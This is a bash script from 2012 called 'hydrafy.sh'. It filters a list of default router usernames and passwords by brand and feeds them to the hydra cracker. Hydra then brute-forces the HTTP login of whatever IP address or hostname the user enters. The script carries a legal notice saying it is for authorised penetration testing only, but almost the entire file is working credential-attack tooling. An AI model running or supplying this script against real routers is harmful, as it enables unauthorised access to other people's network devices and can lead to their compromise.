#!/bin/bash
function script_info--()
{
##~~~~~~~~~~~~~~~~~~~~~~~~~ File and License Info ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## Filename: hydrafy.sh
## Copyright (C) <2012>  <Snafu>

## This program is free software: you can redistribute it and/or modify
## it under the terms of the GNU General Public License as published by
## the Free Software Foundation, either version 3 of the License, or
## (at your option) any later version.

## This program is distributed in the hope that it will be useful,
## but WITHOUT ANY WARRANTY; without even the implied warranty of
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
## GNU General Public License for more details.

## You should have received a copy of the GNU General Public License
## along with this program.  If not, see <http://www.gnu.org/licenses/>.
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Legal Notice ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## This script was written with the intent for Legal PenTesting uses only.
## Make sure that you have consent prior to use on a device other than your own.
## Doing so without the above is a violation of Federal/State Laws within the United States of America.
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##_____________________________________________________________________________##
## Prior to usage, I ask that you take the time to read fully through the script to understand the dynamics of the script.  Don't just be a $cr!pt K!dd!3 here; actually understand what it is that you are doing.

## I consider any script/program I write to always be a work in progress.  Please send any tips/tricks/streamlining ideas/comments/kudos via email to will@configitnow.com

## Comments written with a triple # are notes to myself, please ignore them.

## Colorsets ##
## echo -e "\033[1;32m = Instructions
## echo -e "\033[1;33m = Outputs
## echo -e "\033[1;34m = Headers
## echo -e "\033[36m   = Inputs
## echo -e "\033[31m   = Warnings / Infinite Loops
##_____________________________________________________________________________##


##~The Following Required Programs Must be in Your Path for Full Functionality~##
## This was decided as the de facto standard versus having the script look in locations for the programs themselves with the risk of them not being there.  Odds favor that they will be in /usr/bin or some other location readily available in your path...

## hydra
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Requested Help ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## If you know of a router/username/password that is not included in router.lst, please make the appropriate changes to spread.ods and I will update as requested.  Make sure that if a username or password is "n/a", "blank", "none" or etc, that you leave it blank in the update request.
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~ Planned Implementations ~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## Creation of a function that will save username and passwords to seperate files if desired
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ To Do ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~ Development Notes ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## After some serious thought and deliberation, I decided to make this a 3 choice script
## Display the user/pass combos, Save the user/pass combos, or just save and run hydra

## Support for the Router Attack method is limited to browser-based http-get requests right now,
## Feel free to do the work for me, if your work is good....I'll implement it and give you credit

## Version 7.2 of hydra can be obtained via: wget http://www.thc.org/releases/hydra-7.2-src.tar.gz

## There is now an option for -C -or- -L and -P with reference to methodology of attack

## router.lst has been parsed for duplicate values and I have removed as many of them as I could find.
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~## 


##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ Bug Traq ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##


##~~~~~~~~~~~~~~~~~~~~~~~~~~~ Credits and Kudos ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
## First and foremost, to God above for giving me the abilities I have, Amen.

## @Kos for forcing me to learn some regex

## @The_Eccentric for reigniting the spark to publish this script

## TAPE for making me look deper into regex and pointing out the 360+ duplicate usernames and passwords within router.lst

## Kudos to my wife for always standing by my side, having faith in me, and showing the greatest of patience for my obsession with hacking.
##~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~##
sleep 0
}

##~~~~~~~~~~~~~~~~~~~~~~~~ BEGIN Repitious Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~##
## Usage funtion for printing the help message
function usage--()
{
clear
echo -e "\033[1;34m
Hydrafy {Aka HydraFu}
Author: Snafu ----> will@configitnow.com
Version \033[1;33m$current_ver\033[1;34m (\033[1;33m$rel_date\033[1;34m)\033[1;32m
Read Comments Prior to Usage"
echo -e "\033[1;32m
Usage:
./hydrafy -f <file to be parsed> -r <brand of router to parse for>
"
}

parser--()
{
#p_value= ## Parsing style
clear
echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-------------------------------------------------------
                     Parser Style
-------------------------------------------------------
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Anywhere\033[1;32m                 [grep -i <brand of router>]\033[36m

2) Starts with\033[1;32m             [grep -i ^<brand of router>]\033[36m

3) Word match\033[1;32m             [grep -iwx <brand of router>]\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
read p_value
case $p_value in
	1|2|3) menu--;;
	*) echo -e "\033[31m\nYOU MUST MAKE A VALID SELECTION TO PROCEED"
	sleep 1
	parser--;;
esac
}
##~~~~~~~~~~~~~~~~~~~~~~~~~ END Repitious Functions ~~~~~~~~~~~~~~~~~~~~~~~~~~~##


function menu--()
{
#selection= ## Menu Choice
clear
echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-------------------------------------------------------
                   Hydrafy Choices
-------------------------------------------------------
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) Display Usernames:Passwords

2) Save Usernames:Passwords to a file

3) Implement Router Attack via Hydra\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
read selection
case $selection in
	1) display--;;

	2) file_save--;;

	3) hydrafy--;;

	*) echo -e "\033[31m\nYOU MUST MAKE A VALID SELECTION TO PROCEED"
	sleep 1
	menu--;;
esac
}

function display--()
{
clear
echo -e "\033[1;34m
--------------------------------------------------------\033[1;33m"
case $p_value in
	1) grep -i $ROUTER $FILE | awk -F\| '{ print $2":"$3 }';;

	2) grep -i ^$ROUTER $FILE | awk -F\| '{ print $2":"$3 }';;

	3) grep -iwx $ROUTER $FILE | awk -F\| '{ print $2":"$3 }';;
esac

echo -e "\033[1;34m--------------------------------------------------------\033[1;32m

The usernames/passwords above were derived from this wordsearch:\033[1;33m $ROUTER
"
}

function file_save--()
{
#SAVE= ## Filename to save output to
clear
while [ -z $SAVE ];do
	echo -e "\033[36m\nFile Name?"
	read SAVE
done

case $p_value in
	1) grep -i $ROUTER $FILE | awk -F\| '{ print $2":"$3 }' > $SAVE;;

	2) grep -i ^$ROUTER $FILE | awk -F\| '{ print $2":"$3 }' > $SAVE;;

	3) grep -iwx $ROUTER $FILE | awk -F\| '{ print $2":"$3 }' > $SAVE;;
esac

echo -e "\033[1;32m
File Written to:\033[1;33m $SAVE\033[1;32m

The usernames/passwords above were derived from this wordsearch:\033[1;33m $ROUTER
"
}

function hydrafy--()
{
style= ## Method of attack
ip= ## Tgt address for hydra
at= ## path for past root
while [ -z $style ];do
	clear
	echo -e "\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-------------------------------------------------------------------------------------------
                               Username/Password Attack Style
-------------------------------------------------------------------------------------------
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[36m
1) -C (recommended)\033[1;32m    [colon separated "login:pass" format]\033[31m (Recommended)\033[36m

2) -L and -P\033[1;32m           [load logins from $FILE and load passwords from $FILE]\033[1;34m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
	read style
	case $style in
		1) case $p_value in
			1) grep -i $ROUTER $FILE | awk -F\| '{ print $2":"$3 }' > snakebite.txt;;

			2) grep -i ^$ROUTER $FILE | awk -F\| '{ print $2":"$3 }' > snakebite.txt;;

			3) grep -iwx $ROUTER $FILE | awk -F\| '{ print $2":"$3 }' > snakebite.txt;;
		esac;;

		2) case $p_value in
			1) grep -i $ROUTER $FILE | awk -F\| '{ print $2 }' | sort | uniq > user.txt
			grep -i $ROUTER $FILE | awk -F\| '{ print $3 }' | sort | uniq > pass.txt;;

			2) grep -i ^$ROUTER $FILE | awk -F\| '{ print $2 }' | sort | uniq > user.txt
			grep -i ^$ROUTER $FILE | awk -F\| '{ print $3 }' | sort | uniq > pass.txt;;

			3) grep -iwx $ROUTER $FILE | awk -F\| '{ print $2 }' | sort | uniq > user.txt
			grep -iwx $ROUTER $FILE | awk -F\| '{ print $3 }' | sort | uniq > pass.txt;;
		esac;;

		*) echo -e "\033[31m\nYOU MUST MAKE A SELECTION TO PROCEED"
		sleep 1 
		style= ;; ## Nulled
	esac

done

clear
echo -e "\033[1;36m\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\033[1;34m
########Example URL#########\033[1;32m
http://example.com/index.asp
-or-
http://192.168.1.1/index.asp\033[1;34m
############################\033[1;32m

index.asp will describe the \"path past root\"
\033[1;36m
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
while [ -z $ip ];do
	echo -e "\033[36m
Tgt IP/Hostname? ----->\033[1;32m {http:// is prepended by default}\033[1;34m <-----"
	read ip
done

while [ -z $var ];do
	echo -e "\033[36m\nDoes the URL extend past root? <y or n>"
	read var
	case $var in
		y|Y) extend="yes" ;;
		n|N) extend="no" ;;
		*) var= ;; ## Nulled
	esac

done

case $extend in
	yes) while [ -z $at ];do
		echo -e "\033[36m\nWhat is the path past root?"
		read at
	done

	case $style in
		1) hydra $ip -C snakebite.txt -t 1 -V -f http-get /"$at" ;;
		2) hydra $ip -L user.txt -P pass.txt -t 1 -V -f http-get /"$at" ;;
	esac;;


	no)
	case $style in
		1) hydra $ip -C snakebite.txt -t 1 -V -f http-get / ;;
		2) hydra $ip -L user.txt -P pass.txt -t 1 -V -f http-get / ;;
	esac;;

esac
}

while getopts "f:r:" options; do
  case $options in
    f) FILE=$OPTARG;;
    r) ROUTER=$OPTARG;;
    *) usage--;;

  esac
done

current_ver="1.0"
rel_date="9 February 2012"
if [[ -n "$FILE" && -n "$ROUTER" ]]; then
	parser--
else
	usage--
fi